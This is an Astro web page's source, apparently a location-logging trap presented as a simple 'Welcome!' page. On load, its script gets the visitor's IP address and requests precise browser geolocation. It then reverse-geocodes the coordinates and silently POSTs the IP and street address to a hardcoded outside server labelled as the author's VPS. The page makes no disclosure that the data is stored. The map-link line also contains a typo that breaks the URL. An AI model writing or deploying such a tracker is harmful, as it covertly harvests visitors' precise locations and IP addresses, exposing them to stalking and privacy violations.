---
import Layout from '../layouts/Layout.astro';
---

<Layout>
  <main>
    <h1>Welcome!</h1>
    <div id="visitor-info">Loading...</div>
    <div id="map-link" style="display:none;"></div>
  </main>

  <script>
    document.addEventListener('DOMContentLoaded', () => {
      function getVisitorInfo() {
        fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ipAddress = data.ip;
            if (navigator.geolocation) {
              navigator.geolocation.getCurrentPosition(
                (position) => {
                  const latitude = position.coords.latitude;
                  const longitude = position.coords.longitude;

                  fetch(`https://geocode.maps.co/reverse?lat=${latitude}&lon=${longitude}`)
                  .then(response => response.json())
                  .then(locationData => {
                      let locationString = "Location: ";
                      if (locationData.display_name) {
                        locationString += locationData.display_name;
                      } else {
                        locationString += `Latitude: ${latitude}, Longitude: ${longitude}`;
                      }

                      // --- Send data to your VPS ---
                      const data = {
                        ip: ipAddress,
                        location: locationString
                      };

                      fetch('https://95.111.255.206', { // Replace with your VPS address and port
                        method: 'POST',
                        headers: {
                          'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(data),
                      })
                      .then(response => {
                          if (!response.ok) {
                            throw new Error(`HTTP error! status: ${response.status}`);
                          }
                          return response.json();
                        })
                      .then(result => {
                          console.log('Location data sent successfully:', result);
                        })
                      .catch(error => {
                          console.error('Error sending location data:', error);
                        });
                      // --- End send data to VPS ---

                      // The rest of the code for displaying info and map link:
                      document.getElementById('visitor-info').textContent = `IP: ${ipAddress}, ${locationString}`;
                      const mapLink = `http://www.google.com/maps?q=$/{latitude},${longitude}`;
                      const mapLinkElement = document.getElementById('map-link');
                      mapLinkElement.innerHTML = `<a href="${mapLink}" target="_blank" rel="noopener noreferrer">View on Google Maps</a>`;
                      mapLinkElement.style.display = 'block';
                    })
                  .catch(error => {
                      console.error('Error getting location details:', error);
                    });
                },
                (error) => {
                  console.error('Error getting geolocation:', error);
                },
                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
              );
            } else {
              console.error('Geolocation is not supported by this browser.');
            }
          })
        .catch(error => {
            console.error('Could not get IP address:', error);
          });
      }

      getVisitorInfo();
    });
  </script>
</Layout>
